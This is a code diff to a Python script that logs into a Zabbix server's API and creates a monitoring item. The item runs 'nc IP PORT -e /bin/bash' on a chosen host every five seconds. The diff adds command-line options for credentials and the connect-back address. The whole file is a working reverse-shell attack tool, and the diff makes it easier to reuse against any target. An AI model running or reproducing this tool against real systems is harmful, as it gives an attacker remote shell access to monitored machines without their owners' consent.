@@ -1,10 +1,25 @@
-from pyzabbix import ZabbixAPI, ZabbixAPIException
+#!/usr/bin/env python3
+"""
+Usage: zabbix_shell_create_on_Linux.py --api http://IP/zabbix/api_jsonrpc.php --user Admin --password zabbix --host host1 --connect-ip 192.168.56.100 --connect-port 4444
+"""
+import argparse
 import sys
 
-api_address=raw_input("enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"": \n")
-user= raw_input("enter username: \n")
-password= raw_input("enter password: \n")
-hostname=raw_input("enter hostname: \n")
+from pyzabbix import ZabbixAPI, ZabbixAPIException
+
+parser = argparse.ArgumentParser(description="Create a Zabbix item that runs a nc reverse shell on Linux.")
+parser.add_argument("--api", required=True, help="Zabbix API URL, e.g. http://IP/zabbix/api_jsonrpc.php")
+parser.add_argument("--user", required=True, help="Zabbix username")
+parser.add_argument("--password", required=True, help="Zabbix password")
+parser.add_argument("--host", required=True, help="Zabbix host name")
+parser.add_argument("--connect-ip", required=True, help="IP to connect back to")
+parser.add_argument("--connect-port", required=True, help="Port to connect back to")
+args = parser.parse_args()
+
+api_address = args.api
+user = args.user
+password = args.password
+hostname = args.host
 # hostid=raw_input("enter hostid: \n")
 
 zapi = ZabbixAPI(api_address)
@@ -21,12 +36,15 @@ if hosts:
     try:
         item = zapi.item.create(
             hostid=host_id,
-            name='netcat_create_reverse_shell',
-            key_='system.run["nc 192.168.56.100 4444 -e /bin/bash"]',
+            name="netcat_create_reverse_shell",
+            key_='system.run["nc {connect_ip} {connect_port} -e /bin/bash"]'.format(
+                connect_ip=args.connect_ip,
+                connect_port=args.connect_port,
+            ),
             type=0,
             value_type=4,
             interfaceid=hosts[0]["interfaces"][0]["interfaceid"],
-            delay=5
+            delay=5,
         )
     except ZabbixAPIException as e:
         print(e)
